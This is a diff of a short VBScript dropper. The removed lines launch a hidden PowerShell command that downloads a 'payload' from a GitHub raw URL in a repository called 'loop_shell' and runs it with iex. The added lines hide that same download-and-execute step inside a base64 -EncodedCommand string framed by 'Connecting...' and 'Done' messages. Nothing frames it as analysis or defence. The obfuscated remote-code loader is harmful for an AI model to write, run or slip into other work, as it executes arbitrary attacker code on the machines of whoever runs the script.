@@ -1,10 +1,5 @@
-Set objShell = CreateObject("WScript.Shell")
-
-' Define the PowerShell command
-powershellCommand = "powershell.exe -Command ""iwr https://raw.githubusercontent.com/anaprivate/loop_shell/main/payload -UseBasicParsing | iex"""
-
-' Run the PowerShell command
-objShell.Run powershellCommand, 0, True
-
-' Cleanup
-Set objShell = Nothing
+Set sh = CreateObject("WScript.Shell")
+encoded = "VwByAGkAdABlAC0ASABvAHMAdAAgACIAQwBvAG4AbgBlAGMAdABpAG4AZwAuAC4ALgAiADsAIABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYQBuAGEAcAByAGkAdgBhAHQAZQAvAGwAbwBvAHAAXwBzAGgAZQBsAGwALwBtAGEAaQBuAC8AcABhAHkAbABvAGEAZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEQAbwBuAGUAIgA="
+cmd = "powershell.exe -EncodedCommand " & encoded
+sh.Run cmd, 1, True
+Set sh = Nothing
